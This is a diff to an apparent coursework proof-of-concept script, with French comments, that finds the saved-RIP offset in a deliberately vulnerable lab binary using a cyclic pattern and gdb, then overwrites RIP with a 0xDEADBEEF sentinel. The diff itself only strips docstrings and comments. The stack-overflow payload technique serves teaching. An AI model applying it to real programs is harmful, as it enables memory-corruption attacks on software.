@@ -1,18 +1,5 @@
 #!/usr/bin/env python3
-"""PoC : contrôle de RIP sur 01_stack_bof_vuln (bonus, cf. sujet §4).
-
-Démonstration en deux temps, sur le profil _vuln (no-PIE, sans canary, NX off) :
-  1. retrouver l'offset buffer -> adresse de retour (saved RIP) via un motif
-     cyclique (pwntools cyclic / cyclic_find) ;
-  2. prouver le contrôle de RIP en le forçant à une valeur sentinelle.
-
-L'observation passe par gdb en mode batch (robuste, indépendant des core dumps).
-C'est le second sens d'« offset » du sujet : la distance buffer -> adresse de
-retour, à ne pas confondre avec l'offset statique (adresse d'instruction) du
-rapport.
-
-Usage : python poc/poc_stack_bof.py [binaire]
-"""
+"""PoC : contrôle de RIP sur 01_stack_bof_vuln via cyclic pattern + gdb batch."""
 
 from __future__ import annotations
 
@@ -28,7 +15,6 @@ SENTINELLE = 0xDEADBEEF
 
 
 def _gdb_crash(binary: str, data: bytes) -> tuple[int | None, int | None]:
-    """Exécute `binary` avec `data` sur stdin sous gdb ; renvoie (RIP, [RSP])."""
     with tempfile.NamedTemporaryFile(delete=False) as tf:
         tf.write(data)
         chemin = tf.name
@@ -59,7 +45,6 @@ def main() -> int:
         return 1
     print(f"[*] Cible : {binary}")
 
-    # 1. Découverte de l'offset via motif cyclique.
     motif = cyclic(300, n=8)
     _, ret = _gdb_crash(binary, motif)
     if ret is None:
@@ -69,7 +54,6 @@ def main() -> int:
     print(f"[+] Adresse de retour écrasée : {ret:#018x}")
     print(f"[+] Offset buffer -> saved RIP : {offset} octets")
 
-    # 2. Preuve de contrôle : forcer RIP = SENTINELLE.
     payload = b"A" * offset + p64(SENTINELLE)
     rip, _ = _gdb_crash(binary, payload)
     print(f"[+] Payload : {offset} x 'A' + p64({SENTINELLE:#x})")
